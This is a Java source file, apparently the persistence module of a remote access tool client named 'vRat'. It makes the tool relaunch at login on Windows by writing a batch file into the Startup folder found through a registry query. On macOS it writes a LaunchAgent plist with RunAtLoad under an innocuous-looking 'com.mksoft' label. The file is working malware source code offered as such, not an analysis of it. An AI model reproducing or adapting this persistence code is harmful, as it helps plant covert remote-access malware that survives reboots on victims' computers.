package vrat.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URISyntaxException;

/*
 * @author vrmg
 */

public class Startup {

	private final String osName = System.getProperty("os.name").toLowerCase();
	private final String fileSeparator = System.getProperty("file.separator");
	private final String javaHome = System.getProperty("java.home");
	private final String userHome = System.getProperty("user.home");

	private File getJarFile() throws URISyntaxException {
		return new File(Config.class.getProtectionDomain().getCodeSource().getLocation().toURI());
	}

	private File getStartupFile() throws Exception {
		if (osName.startsWith("windows")) {
			Process process = Runtime.getRuntime().exec("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" /v Startup");
			BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String result = "", line;
			while ((line = in.readLine()) != null) {
				result += line;
			}
			in.close();
			result = result.replaceAll(".*REG_SZ[ ]*", "");
			return new File(result + fileSeparator + getJarFile().getName().replaceFirst(".jar", ".bat"));
		} 
		else if (osName.startsWith("mac")) {
			return new File(userHome + "/Library/LaunchAgents/com.mksoft." + getJarFile().getName().replaceFirst(".jar", ".plist"));
		} 
		else {
			throw new Exception("Unknown Operating System Name \"" + osName + "\"");
		}
	}

	/*
	 * Returns if vRat is installed on system or not
	 */
	private boolean isInstalled() throws Exception {
		return getStartupFile().exists();
	}

	/*
	 * Install the specified class from the current JAR file to run on system
	 */
	private void install(String className, String windowTitle) throws Exception {
		File startupFile = getStartupFile();
		PrintWriter out = new PrintWriter(new FileWriter(startupFile));
		if (osName.startsWith("windows")) {
			out.println("@echo off");
			out.println("start \"" + windowTitle + "\" \"" + javaHome + fileSeparator + "bin" + fileSeparator + "java.exe\" -cp " + getJarFile() + " " + className);
		} else if (osName.startsWith("mac")) {
			out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
			out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
			out.println("<plist version=\"1.0\">");
			out.println("<dict>");
			out.println("   <key>Label</key>");
			out.println("   <string>com.mksoft." + getJarFile().getName().replaceFirst(".jar", "") + "</string>");
			out.println("   <key>ProgramArguments</key>");
			out.println("   <array>");
			out.println("      <string>" + javaHome + fileSeparator + "bin" + fileSeparator + "java</string>");
			out.println("      <string>-cp</string>");
			out.println("      <string>" + getJarFile() + "</string>");
			out.println("      <string>" + className + "</string>");
			out.println("   </array>");
			out.println("   <key>RunAtLoad</key>");
			out.println("   <true/>");
			out.println("</dict>");
			out.println("</plist>");
		} else {
			throw new Exception("Unknown Operating System Name \"" + osName + "\"");
		}
		out.close();
	}

	/*
	 * Uninstalls vRat
	 */
	public void uninstall() {
		try {
			File startupFile = getStartupFile();
			if (startupFile.exists()) {
				startupFile.delete();
			}
			else{
				System.out.println("Already deleted");
			}
		} 
		catch (Exception e) {
			e.printStackTrace();
			System.out.println("Something went wrong with deleting vRat from startup");
		}
	}
	
	/*
	* Adds vRat to startup
	*/
	public void initialize() {
		try {
			if(!isInstalled()){
				install("Config", "vRat");
			}
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Something went wrong with applying to startup");
		}
	}
}
